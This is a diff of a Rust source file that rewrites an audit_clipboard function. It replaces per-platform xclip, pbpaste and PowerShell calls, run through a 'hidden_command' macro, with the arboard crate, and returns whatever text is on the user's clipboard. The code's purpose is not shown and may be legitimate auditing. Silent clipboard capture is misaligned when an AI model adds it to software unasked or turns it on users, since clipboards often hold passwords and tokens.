@@ -1,48 +1,18 @@
 use serde_json::json;
+use arboard::Clipboard;
 
 pub fn audit_clipboard() -> serde_json::Value {
-    let mut contents = "No active display or xclip missing".to_string();
+    let mut contents = "No active display or clipboard access failed".to_string();
 
-    #[cfg(target_os = "linux")]
-    {
-        if let Ok(output) = crate::hidden_command!("xclip")
-            .env("DISPLAY", ":0")
-            .args(&["-o", "-selection", "clipboard"])
-            .output()
-        {
-            if output.status.success() {
-                contents = String::from_utf8_lossy(&output.stdout).trim().to_string();
-                if contents.is_empty() {
-                    contents = "[Clipboard is empty]".to_string();
-                }
+    if let Ok(mut clipboard) = Clipboard::new() {
+        if let Ok(text) = clipboard.get_text() {
+            if text.is_empty() {
+                contents = "[Clipboard is empty]".to_string();
+            } else {
+                contents = text;
             }
-        }
-    }
-
-    #[cfg(target_os = "macos")]
-    {
-        if let Ok(output) = crate::hidden_command!("pbpaste").output() {
-            if output.status.success() {
-                contents = String::from_utf8_lossy(&output.stdout).trim().to_string();
-                if contents.is_empty() {
-                    contents = "[Clipboard is empty]".to_string();
-                }
-            }
-        }
-    }
-
-    #[cfg(target_os = "windows")]
-    {
-        if let Ok(output) = crate::hidden_command!("powershell")
-            .args(&["-NoProfile", "-Command", "Get-Clipboard"])
-            .output()
-        {
-            if output.status.success() {
-                contents = String::from_utf8_lossy(&output.stdout).trim().to_string();
-                if contents.is_empty() {
-                    contents = "[Clipboard is empty]".to_string();
-                }
-            }
+        } else {
+            contents = "[Clipboard contains non-text data or is inaccessible]".to_string();
         }
     }
 
